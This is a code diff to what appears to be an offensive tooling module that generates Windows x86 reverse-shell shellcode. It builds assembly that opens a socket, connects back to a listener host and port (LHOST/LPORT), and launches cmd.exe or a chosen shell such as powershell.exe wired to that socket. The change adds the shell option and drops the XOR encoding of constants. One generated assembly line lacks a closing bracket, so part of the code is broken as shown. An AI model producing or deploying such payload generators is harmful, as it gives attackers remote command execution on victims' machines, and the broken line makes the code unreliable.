@@ -49,6 +49,10 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    arguments["SHELL"] = {}
+    arguments["SHELL"]["optional"] = "yes"
+    arguments["SHELL"]["description"] = "Shell environment (powershell.exe, cmd.exe, etc)"
+
     advanced = {}
     advanced["EXITFUNC"] = {}
     advanced["EXITFUNC"]["optional"] = "yes"
@@ -82,7 +86,7 @@ class Shellcode():
             "wsaData"                       : 0x00,
             "name"                          : ctypes.sizeof(ws2def.sockaddr),
             "lpStartupInfo"                 : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
-            "lpCommandLine"                 : len("cmd\x00"),
+            "lpCommandLine"                 : self.shell_env_len,
             "lpProcessInformation"          : 0x00,
         })
 
@@ -95,10 +99,25 @@ class Shellcode():
         """Configure the arguments that may be used by the shellcode stub
         """
 
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
-        argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
+        all_args = Shellcode.arguments
+        all_args.update(Shellcode.advanced)
+        argv_dict = modparser.argument_check(all_args, self.arg_list)
         if (argv_dict == None):
             exit(-1)
+
+        # Set the shell environment that will be used by the shellcode. We must
+        # ensure to NULL terminate it.
+        if "SHELL" not in argv_dict.keys():
+            self.shell = "cmd.exe"
+        else:
+            self.shell = argv_dict["SHELL"]
+
+        self.shell += "\x00"
+        while (len(self.shell) % 8) != 0:
+            self.shell += "\x00"
+
+        # Document the size of the shell environment
+        self.shell_env_len = len(self.shell)
 
         # Configure the options used by the host to obtain the callback
         if ("LPORT" not in argv_dict.keys()):
@@ -109,6 +128,7 @@ class Shellcode():
         self.lhost = argv_dict['LHOST']
 
         # Set the EXITFUNC and update the necessary dependencies
+        self.exit_func = ""
         if "EXITFUNC" not in argv_dict.keys():
             self.exit_func = "terminate"
         else:
@@ -177,9 +197,8 @@ call_WSASocketA:
         #   "cmd"
         #
         # These values will then have to be XOR'd by 0xFFFFFFFF
-        xor_sockaddr = hex(int(f"{sin_port}{sin_family}", 16) ^ 0xFFFFFFFF)
-        xor_std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16) ^ 0xFFFFFFFF)
-        xor_cmd = hex(0x646d63 ^ 0xFFFFFFFF)
+        sockaddr = hex(int(f"{sin_port}{sin_family}", 16))
+        std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16))
 
         src += f"""
 ; EAX => connect([in] SOCKET s,
@@ -191,8 +210,7 @@ call_connect:
     push ecx
     mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {sin_addr}
 
-    mov eax, 0xffffffff
-    xor eax, {xor_sockaddr}
+    mov eax, {sockaddr}
 
     mov dword ptr [ebp - {self.storage_offsets['name']}], eax
     lea ecx, [ebp - {self.storage_offsets['name']}]
@@ -215,8 +233,7 @@ memsetStructBuffer:
 initMembers:
     mov al, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     mov [ebx], eax
-    mov eax, 0xffffffff
-    xor eax, {xor_std_handles}
+    mov eax, {std_handles}
     mov [ebx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
     mov [ebx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], esi
     mov [ebx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], esi
@@ -232,7 +249,28 @@ initMembers:
 ;                       [in, optional]      LPCSTR                lpCurrentDirectory,
 ;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
-call_CreateProccessA:
+call_CreateProccessA:\n"""
+
+        cmd_buffer = convert.from_str_to_xwords(self.shell, 0x04)
+        write_index = self.storage_offsets['lpCommandLine']
+
+        for i in range(len(cmd_buffer["DWORD_LIST"])):
+            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', cmd_buffer["DWORD_LIST"][i]).hex() )
+            src += "    mov [ebp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
+
+        for i in range(len(cmd_buffer["WORD_LIST"])):
+            src += "    mov cx, 0x{}\n".format( struct.pack('<H', cmd_buffer["WORD_LIST"][i]).hex() )
+            src += "    mov [ebp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
+
+        for i in range(len(cmd_buffer["BYTE_LIST"])):
+            src += "    mov cl, {}\n".format( hex(cmd_buffer["BYTE_LIST"][i]) )
+            src += "    mov [ebp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
+
+        src += f"""    xor ecx, ecx
+    mov [ebp - {write_index}, cl
     lea ecx, [ebp - {self.storage_offsets['lpProcessInformation']}]
     push ecx
     push ebx
@@ -246,9 +284,6 @@ call_CreateProccessA:
     push ecx
     push ecx
     lea ecx, [ebp - {self.storage_offsets['lpCommandLine']}]
-    mov eax, 0xffffffff
-    xor eax, {xor_cmd}
-    mov dword ptr [ecx], eax
     push ecx
     xor ecx, ecx
     push ecx
